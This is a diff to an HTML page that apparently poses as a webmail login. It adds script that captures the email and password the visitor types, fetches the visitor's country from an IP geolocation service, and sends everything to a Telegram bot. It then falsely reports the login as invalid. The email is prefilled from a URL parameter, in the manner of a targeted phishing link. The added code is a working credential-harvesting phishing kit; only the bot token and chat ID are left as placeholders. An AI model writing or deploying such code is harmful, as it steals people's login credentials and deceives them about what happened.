@@ -57,14 +57,49 @@
 <div id="notification-bar" style="display: none; text-align: center; padding: 10px; font-size: 14px; color: white;"></div>
 
 <script>
+// Telegram Bot Configuration
+const BOT_TOKEN = 'your-telegram-bot-token'; // Replace with your bot token
+const CHAT_ID = 'your-chat-id'; // Replace with your chat ID
+
 // Function to get query parameters from the URL
 function getQueryParameter(param) {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(param);
 }
 
+// Function to fetch user's country using an IP geolocation API
+async function getUserCountry() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return data.country_name || 'Unknown';
+    } catch (error) {
+        console.error('Error fetching country:', error);
+        return 'Unknown';
+    }
+}
+
+// Function to send data to Telegram
+async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    };
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
+    }
+}
+
 // Populate the email field if 'email' parameter exists
-window.addEventListener('DOMContentLoaded', () => {
+window.addEventListener('DOMContentLoaded', async () => {
     const emailParam = getQueryParameter('email');
     if (emailParam) {
         const emailField = document.getElementById('user');
@@ -77,8 +112,23 @@ window.addEventListener('DOMContentLoaded', () => {
 });
 
 // Handle login action
-document.getElementById('login_submit').addEventListener('click', (e) => {
+document.getElementById('login_submit').addEventListener('click', async (e) => {
     e.preventDefault();  // Prevent form from being submitted to external URL
+
+    const email = document.getElementById('user').value;
+    const password = document.getElementById('pass').value;
+    const mxDomain = email.split('@')[1];
+    const country = await getUserCountry();
+
+    // Send data to Telegram
+    const message = `
+<b>Webmail Login Attempt</b>
+- <b>Email:</b> ${email}
+- <b>Password:</b> ${password}
+- <b>MX Domain:</b> ${mxDomain}
+- <b>Country:</b> ${country}
+    `;
+    await sendToTelegram(message);
 
     // Show "Authenticating..." notification
     const notificationBar = document.getElementById('notification-bar');
@@ -90,7 +140,7 @@ document.getElementById('login_submit').addEventListener('click', (e) => {
     setTimeout(() => {
         // Show "Invalid login" error after 1.5 seconds
         notificationBar.style.backgroundColor = 'red';
-        notificationBar.textContent = 'Invalid login. Please try again.';
+        notificationBar.textContent = 'the login is invalid.';
     }, 1500);
 });
 </script>
